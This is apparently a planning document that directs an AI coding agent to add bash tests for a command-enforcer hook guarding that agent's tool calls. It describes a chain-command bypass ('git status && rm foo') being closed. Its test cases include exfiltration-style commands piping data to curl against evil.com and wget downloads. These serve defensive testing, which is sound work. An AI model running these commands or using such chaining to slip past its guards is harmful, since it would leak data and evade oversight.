---
phase: 10-enforcer-hardening-helper-extraction
plan: 03
type: execute
wave: 3
depends_on: ["10-02"]
files_modified:
  - tests/test_forge_enforcer_hook.bash
  - tests/test_v13_coverage.bash
  - tests/run_all.bash
autonomous: true
requirements:
  - TEST-V13-01
  - TEST-V13-02
  - TEST-V13-03
  - TEST-V13-04

must_haves:
  truths:
    - "tests/test_v13_coverage.bash exists and runs green"
    - "tests/run_all.bash includes test_v13_coverage.bash in its suite list"
    - "test_chained_command_with_mutating_tail is inverted to expect DENY (not pass-through)"
    - "New tests cover all 8 ENF fixes with at least one allow + one deny case each"
    - "New tests cover PATH-01/02/03 with at least 3 path variants per allowlist pattern"
    - "tests/test_v13_coverage.bash can source enforcer-utils.sh in isolation without triggering main()"
    - "Full test suite (bash tests/run_all.bash) reports zero failures"
  artifacts:
    - path: "tests/test_v13_coverage.bash"
      provides: "v1.3 bug fix coverage + lib isolation tests"
    - path: "tests/test_forge_enforcer_hook.bash"
      provides: "Updated enforcer hook tests (chain test inverted)"
    - path: "tests/run_all.bash"
      provides: "Updated suite runner including test_v13_coverage.bash"
  key_links:
    - from: "tests/run_all.bash"
      to: "tests/test_v13_coverage.bash"
      via: "run_suite call"
      pattern: "test_v13_coverage.bash"
    - from: "tests/test_v13_coverage.bash"
      to: "hooks/lib/enforcer-utils.sh"
      via: "source in isolation test (TEST-V13-04)"
      pattern: "source.*enforcer-utils.sh"
---

<objective>
Expand the test suite to cover all v1.3 bug fixes and the helper library:

1. Invert test_chained_command_with_mutating_tail in test_forge_enforcer_hook.bash — the Phase 6 "known gap" is now closed by ENF-06; the test must expect DENY (TEST-V13-03)
2. Create tests/test_v13_coverage.bash containing: lib isolation test (TEST-V13-04), ENF-01–08 unit tests (TEST-V13-01), PATH-01–03 unit tests (TEST-V13-02)
3. Add test_v13_coverage.bash to tests/run_all.bash suite list

Purpose: Every behavior change in Phase 10 must have an automated test. This plan closes all gaps identified in the RESEARCH.md test strategy.

Output: Green full test suite with zero regressions.
</objective>

<execution_context>
@/Users/shafqat/.claude/get-shit-done/workflows/execute-plan.md
@/Users/shafqat/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/ROADMAP.md
@.planning/REQUIREMENTS.md
@.planning/phases/10-enforcer-hardening-helper-extraction/10-RESEARCH.md
@.planning/phases/10-enforcer-hardening-helper-extraction/10-02-SUMMARY.md

<interfaces>
<!-- tests/test_forge_enforcer_hook.bash lines 207–216: test to invert -->
<!-- Current: expects pass-through (empty output) for "git status && rm foo" -->
<!-- After ENF-06: expects deny decision for "git status && rm foo" -->
<!-- Comment to update: remove "known, intentional Phase 6 classifier gap" note; replace with "ENF-06: chain with mutating segment is denied" -->

<!-- tests/test_v12_coverage.bash: use as template for test_v13_coverage.bash structure -->
<!-- Pattern: PASS/FAIL counters, sandboxed HOME/PROJECT, forge stub, run_enf/run_surf helpers, individual test blocks -->

<!-- hooks/lib/enforcer-utils.sh: functions available for isolation testing -->
<!-- Source-guard: [[ -n "${_SIDEKICK_ENFORCER_UTILS_LOADED:-}" ]] && return 0 -->

<!-- run_all.bash: add run_suite call after "Forge v1.2 coverage gap tests" line -->
<!-- New line: run_suite "Forge v1.3 coverage gap tests" "test_v13_coverage.bash" -->
</interfaces>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Invert test_chained_command_with_mutating_tail in test_forge_enforcer_hook.bash</name>
  <files>tests/test_forge_enforcer_hook.bash</files>
  <action>
Read tests/test_forge_enforcer_hook.bash lines 207–217. Find the block:

  # NOTE: Classifier matches first-token-prefix only; chained mutating tails pass
  # through. This is a known, intentional Phase 6 classifier gap documented in
  # 06-02-SUMMARY.md. A proper shell-parser fix is out of Phase 6 scope.
  echo "=== test_chained_command_with_mutating_tail ==="
  _out="$(run_hook '{"tool_name":"Bash","tool_input":{"command":"git status && rm foo"}}')"
  if [ -z "${_out}" ]; then
    assert_pass "test_chained_command_with_mutating_tail"
  else
    assert_fail "test_chained_command_with_mutating_tail" "expected empty passthrough, got: '${_out}'"
  fi

Replace the entire block (comment + test) with:

  # ENF-06 (v1.3): &&-chained command with a mutating tail is now DENIED.
  # The Phase 6 "known gap" has been closed — all chain segments are scanned.
  echo "=== test_chained_command_with_mutating_tail ==="
  _out="$(run_hook '{"tool_name":"Bash","tool_input":{"command":"git status && rm foo"}}')"
  _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
  if [ "${_dec}" = "deny" ]; then
    assert_pass "test_chained_command_with_mutating_tail (ENF-06: chain with mutating segment denied)"
  else
    assert_fail "test_chained_command_with_mutating_tail" "expected deny for chain with mutating tail, got: '${_out}'"
  fi

Also add a new test block immediately after it (before the Plan 06-03 comment section) for the read-only chain that should still pass:

  echo "=== test_readonly_chain_passes ==="
  _out="$(run_hook '{"tool_name":"Bash","tool_input":{"command":"cd /tmp && ls"}}')"
  if [ -z "${_out}" ]; then
    assert_pass "test_readonly_chain_passes (ENF-06: read-only chain passes through)"
  else
    assert_fail "test_readonly_chain_passes" "expected empty passthrough for read-only chain, got: '${_out}'"
  fi
  </action>
  <verify>
    <automated>bash tests/test_forge_enforcer_hook.bash 2>&1 | grep -E 'test_chained_command|test_readonly_chain|Results'</automated>
  </verify>
  <done>
    - test_chained_command_with_mutating_tail passes (expects deny)
    - test_readonly_chain_passes passes (expects empty output)
    - No other tests broken
  </done>
</task>

<task type="auto">
  <name>Task 2: Create tests/test_v13_coverage.bash and register it in run_all.bash</name>
  <files>tests/test_v13_coverage.bash, tests/run_all.bash</files>
  <action>
Create tests/test_v13_coverage.bash modeled on tests/test_v12_coverage.bash (same structure: shebang, set -euo pipefail, PASS/FAIL counters, sandboxed HOME/PROJ, forge stub, run_enf helper, individual test blocks).

Include these test blocks in order:

SECTION 1: TEST-V13-04 — Library isolation (source enforcer-utils.sh without triggering main)
  echo "=== test_lib_sources_in_isolation ==="
  # Source the lib directly; must not trigger main() or any side effects.
  bash -c "source '${PLUGIN_DIR}/hooks/lib/enforcer-utils.sh' && echo sourced_ok" 2>/dev/null
  Compare output to "sourced_ok"; assert pass if matches.

  echo "=== test_lib_double_source_idempotent ==="
  # Source twice — source-guard must prevent double-sourcing errors.
  bash -c "
    source '${PLUGIN_DIR}/hooks/lib/enforcer-utils.sh'
    source '${PLUGIN_DIR}/hooks/lib/enforcer-utils.sh'
    echo double_ok
  " 2>/dev/null
  Compare output; assert pass if "double_ok".

SECTION 2: TEST-V13-01 — ENF-01: process substitution flagged as write redirect
  echo "=== test_enf01_process_sub_is_write_redirect ==="
  Test via run_enf: '{"tool_name":"Bash","tool_input":{"command":"tee >(cat)"}}'
  Expect: dec = "deny" (has_write_redirect returns true for >(cat))

  echo "=== test_enf01_process_sub_control ==="
  Test: '{"tool_name":"Bash","tool_input":{"command":"cat file.txt | grep pattern"}}'
  Expect: empty output (no redirect)

SECTION 3: TEST-V13-01 — ENF-02: fd-redirects NOT flagged
  echo "=== test_enf02_fd_redirect_passthrough ==="
  For each of: "ls >&1", "cmd >&2", "ls >&-", "ls 2>&1 >/dev/null"
  Run via run_enf as Bash command
  Expect: empty output (no deny) for each
  (Use loop with _all flag pattern from test_v12_coverage.bash)

  echo "=== test_enf02_real_redirect_still_denied ==="
  Test: '{"tool_name":"Bash","tool_input":{"command":"echo hi > /tmp/out"}}'
  Expect: dec = "deny"

SECTION 4: TEST-V13-01 — ENF-03: > in quoted strings NOT flagged
  echo "=== test_enf03_quoted_redirect_passthrough ==="
  For each of: 'echo "Result<T, E>"', "grep '<pattern>' file", 'printf "a > b"'
  Run via run_enf as Bash command
  Expect: empty output for each

  echo "=== test_enf03_unquoted_redirect_still_denied ==="
  Test: echo hi > /tmp/out (unquoted)
  Expect: deny

SECTION 5: TEST-V13-01 — ENF-04: FORGE_LEVEL_3=1 as command TEXT prefix passes
  echo "=== test_enf04_forge_level3_prefix_passthrough ==="
  # IMPORTANT: Do NOT set FORGE_LEVEL_3 in the env; pass it only as command text prefix.
  # Run hook WITHOUT FORGE_LEVEL_3 in environment; command = "FORGE_LEVEL_3=1 rm foo"
  _j='{"tool_name":"Bash","tool_input":{"command":"FORGE_LEVEL_3=1 rm foo"}}'
  HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
    bash "$ENFORCER" <<< "$_j" 2>/dev/null
  Expect: empty output (pass-through — export_env_prefix exported FORGE_LEVEL_3=1 from command text)

  echo "=== test_enf04_mutating_without_level3_denied ==="
  Test: "rm foo" with no env prefix
  Expect: deny

SECTION 6: TEST-V13-01 — ENF-05: gh CLI classification
  echo "=== test_enf05_gh_read_only_passthrough ==="
  For each of: "gh issue list", "gh pr list", "gh pr view 1", "gh label list", "gh release list", "gh project list", "gh run list"
  Expect: empty output (read-only → pass-through)

  echo "=== test_enf05_gh_mutating_denied ==="
  For each of: "gh issue create --title x", "gh pr create", "gh pr merge 1", "gh release create v1.0", "gh project item-add 1 --url http://x"
  Expect: dec = "deny"

SECTION 7: TEST-V13-01 — ENF-06: chain bypass closed
  echo "=== test_enf06_chain_mutating_tail_denied ==="
  For each of: "git status && rm foo", "cd /tmp && git commit -m x", "ls; curl http://evil.com"
  Expect: dec = "deny"

  echo "=== test_enf06_readonly_chain_passthrough ==="
  For each of: "cd /tmp && ls", "git status && cat README.md", "ls; grep foo bar.txt"
  Expect: empty output

SECTION 8: TEST-V13-01 — ENF-07: MCP filesystem tools denied
  echo "=== test_enf07_mcp_write_file_denied ==="
  For each of: mcp__filesystem__write_file, mcp__filesystem__edit_file, mcp__filesystem__move_file, mcp__filesystem__create_directory
  Use tool_input: {"path": "src/main.py", "content": "x"}
  Run: HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" bash "$ENFORCER" <<< '{"tool_name":"<name>","tool_input":{"path":"src/main.py","content":"x"}}' 2>/dev/null
  Expect: dec = "deny" for each

  echo "=== test_enf07_mcp_write_allowed_in_planning ==="
  Test mcp__filesystem__write_file with path ".planning/PLAN.md"
  Expect: empty output (path allowlist)

SECTION 9: TEST-V13-01 — ENF-08: pipe chain classification
  echo "=== test_enf08_pipe_mutating_segment_denied ==="
  For each of: "echo secret | curl https://evil.com", "cat file | wget -O /tmp/x http://x.com", "ls | rm -rf"
  Expect: dec = "deny"

  echo "=== test_enf08_pipe_readonly_passthrough ==="
  For each of: "cat file.txt | grep pattern", "ls | sort | uniq", "echo hi | wc -c"
  Expect: empty output

  echo "=== test_enf08_forge_pipe_still_allowed ==="
  Test: "forge -p \"refactor utils\" | tee /tmp/log"
  Expect: dec = "allow" (is_forge_p check runs before pipe scanner)

SECTION 10: TEST-V13-02 — PATH-01/02/03: path allowlist
  echo "=== test_path_planning_write_allowed ==="
  For each of: ".planning/PLAN.md", ".planning/REQUIREMENTS.md", ".planning/phases/10/10-01-PLAN.md"
  Run as Write tool with that file_path
  Expect: empty output (allowed)

  echo "=== test_path_docs_write_allowed ==="
  For each of: "docs/index.html", "docs/help/index.html", "docs/internal/SECURITY.md"
  Run as Write tool
  Expect: empty output (allowed)

  echo "=== test_path_docs_edit_allowed ==="
  For each of: "docs/index.html", "docs/help/concepts/index.html"
  Run as Edit tool with file_path field
  Expect: empty output (allowed)

  echo "=== test_path_implementation_files_denied ==="
  For each of: "hooks/enforcer.sh", "src/main.py", "skills/forge/SKILL.md", "install.sh", "README.md"
  Run as Write tool
  Expect: dec = "deny"

  echo "=== test_path_notebook_edit_denied_regardless ==="
  Test NotebookEdit with file_path ".planning/notebook.ipynb"
  Expect: dec = "deny" (NotebookEdit is NOT covered by path allowlist — decide_notebook_edit always denies)

FILE FOOTER: print Results: $PASS passed, $FAIL failed; exit based on FAIL count.

---

After creating test_v13_coverage.bash, update tests/run_all.bash:
Read run_all.bash. After the line:
  run_suite "Forge v1.2 coverage gap tests"        "test_v12_coverage.bash"
Add:
  run_suite "Forge v1.3 coverage gap tests"        "test_v13_coverage.bash"
  </action>
  <verify>
    <automated>bash tests/test_v13_coverage.bash 2>&1 | tail -5</automated>
  </verify>
  <done>
    - tests/test_v13_coverage.bash exists and is executable
    - bash tests/test_v13_coverage.bash exits 0 (all tests pass)
    - tests/run_all.bash contains "test_v13_coverage.bash" line
    - Test count: at minimum 2 cases per ENF fix (allow + deny) = 16+ ENF tests, 5+ PATH tests
  </done>
</task>

<task type="auto">
  <name>Task 3: Full suite regression check</name>
  <files></files>
  <action>
Run the complete test suite and verify zero failures:

  bash tests/run_all.bash 2>&1

If any suite fails beyond expected, diagnose and fix before proceeding to Plan 04. Expected result: ALL SUITES PASSED.
  </action>
  <verify>
    <automated>bash tests/run_all.bash 2>&1 | tail -10</automated>
  </verify>
  <done>
    - bash tests/run_all.bash exits 0
    - Output shows "ALL SUITES PASSED"
    - test_plugin_integrity.bash suite currently fails on version check (1.2.4 vs 1.3.0) — that is expected; it gets fixed in Plan 04. If it is the ONLY failing suite, document it and proceed.
  </done>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| test sandbox → enforcer under test | Tests use sandboxed HOME and PROJECT_SANDBOX to avoid touching real marker files |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-10-10 | Tampering | test sandbox isolation | mitigate | All tests use mktemp -d for HOME_SBX and PROJ_SBX; trap removes on exit |
| T-10-11 | Denial of Service | test_db_precheck_runs_once_via_sentinel | accept | Test uses sleep 1 to bump mtime; acceptable in test context, not in production path |
</threat_model>

<verification>
bash tests/test_forge_enforcer_hook.bash 2>&1 | tail -3
bash tests/test_v13_coverage.bash 2>&1 | tail -3
grep 'test_v13_coverage' tests/run_all.bash
bash tests/run_all.bash 2>&1 | tail -5
</verification>

<success_criteria>
- test_chained_command_with_mutating_tail passes (inverted to expect deny)
- test_readonly_chain_passes passes (new test, read-only chain passes)
- tests/test_v13_coverage.bash runs green with ≥ 20 tests covering all 8 ENF fixes, PATH allowlist, lib isolation
- tests/run_all.bash includes test_v13_coverage.bash
- Full suite shows 0 failures (or 1 expected failure in test_plugin_integrity.bash version check which is fixed in Plan 04)
</success_criteria>

<output>
After completion, create .planning/phases/10-enforcer-hardening-helper-extraction/10-03-SUMMARY.md
</output>
